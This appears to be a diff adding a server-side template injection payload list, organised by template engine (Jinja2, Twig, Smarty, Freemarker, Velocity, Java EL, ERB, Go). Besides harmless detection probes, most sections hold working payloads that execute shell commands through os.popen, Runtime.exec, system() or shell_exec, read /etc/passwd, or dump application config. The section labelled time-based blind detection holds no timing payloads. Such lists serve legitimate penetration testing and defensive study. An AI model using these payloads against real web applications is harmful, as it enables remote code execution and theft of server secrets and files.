@@ -1,0 +1,79 @@
+# SSTI Payloads
+# Categories: Jinja2, Twig, Freemarker, Velocity, Jade/Pug, Java EL
+
+# === Generic Detection ===
+{{7*7}}
+${7*7}
+#{7*7}
+*{7*7}
+{{7*'7'}}
+<%= 7*7 %>
+
+# === Jinja2 (Python/Flask) ===
+{{7*7}}
+{{7*'7'}}
+{{config}}
+{{request}}
+{{self.__class__.__mro__}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()[X]}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.application.__globals__['os'].popen('id').read()}}
+{% print config %}
+{% for x in ''.__class__.__mro__[1].__subclasses__() %}{% if 'warning' in x.__name__ %}{{x.__init__.__globals__['os'].popen('id').read()}}{% endif %}{% endfor %}
+
+# === Twig (PHP) ===
+{{7*7}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("id")}}
+{{_self.env.setCache("id")}}
+{{_self.env.execute("cat /etc/passwd")}}
+
+# === Smarty (PHP) ===
+{$smarty.version}
+{php}echo shell_exec('id');{/php}
+{system('id')}
+
+# === Freemarker (Java) ===
+${7*7}
+${7*'7'}
+${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
+
+# === Velocity (Java) ===
+#set($x=7*7)$x
+#set($e="exp")
+#set($c=$e.getClass().forName("java.lang.Runtime"))
+#set($r=$c.getMethod("getRuntime").invoke(null))
+#set($p=$r.exec("id"))
+$p
+
+# === Jade/Pug ===
+#{7*7}
+- var x = 7*7
+= x
+
+# === Java Expression Language (EL) ===
+${7*7}
+${request}
+${session}
+${applicationScope}
+${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
+${\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",\"\".getClass()).invoke(\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\")}
+
+# === Ruby ERB ===
+<%= 7*7 %>
+<%= system("id") %>
+<%= `id` %>
+<%= IO.popen("id").read() %>
+
+# === Golang Template ===
+{{.}}
+{{printf "%s" "test"}}
+{{if .}}{{else}}{{end}}
+{{range .}}{{.}}{{end}}
+
+# === Blind Detection (time-based) ===
+{% if 1==1 %}{{ config }}{% endif %}
+{{ ''.__class__.__mro__[1].__subclasses__()[X] }}
+{{ (1+1) }}
